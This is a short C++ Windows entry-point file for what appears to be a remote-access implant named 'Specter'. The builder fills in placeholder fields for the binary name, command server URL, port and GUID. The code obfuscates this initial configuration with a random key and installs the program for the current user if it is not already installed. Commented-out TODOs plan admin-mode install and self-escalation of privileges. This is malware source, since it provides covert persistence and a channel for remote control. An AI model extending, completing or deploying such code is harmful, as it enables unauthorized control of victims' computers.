#include <windows.h>

#include "SpecterBasicDeployment.hpp"
#include "SpecterLib/Algorithm.h"
#include "SpecterLib/InitialConfig.h"
#include "SpecterLib/StrUtils.h"

//#include "SpecterLib/SelfProcessUtils.h"
//if (SelfProcessUtils::IsProcessElevated())
//{
//	// TODO Admin Install Mode and then Exit
//}
//else if (false) // Attempt self escalation if not already attempted once
//{
//	// TODO Self Escalation Code
//	// Run self with priveleges
//	// If successful, exit, if failed, continue to basic deployment
//}

int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
{
	// Configurable fields from the SpecterBuilder, these string literals can be overriden (but not past their limit) very easily,
	// And with it, we can configure initial behavior of Specter, until we can download the real configuration from the server itself.
	std::wstring name = StrUtils::Widen("SPECTER_BINARY_NAME");
	std::string server_url = "SPECTER_SERVER_URL_HERE";
	std::string server_port = "SPECTER_PORT_HERE";
	std::string guid = "SPECTER_GUID_HERE";

	// Deploy as normal user
	uint8_t obscrypto_key = Algorithm::GenerateRandomUInt<uint8_t>();
	InitialConfig initial_config(std::move(server_url), std::move(server_port), std::move(guid));

	const std::wstring filename = name + L".exe";
	SpecterBasicDeployment deployement(std::move(name), filename, StrUtils::Widen(initial_config.ToObscryptoB64(obscrypto_key)));

	if (!deployement.IsInstalled())
	{
		deployement.Install();
	}

	return 0;
}
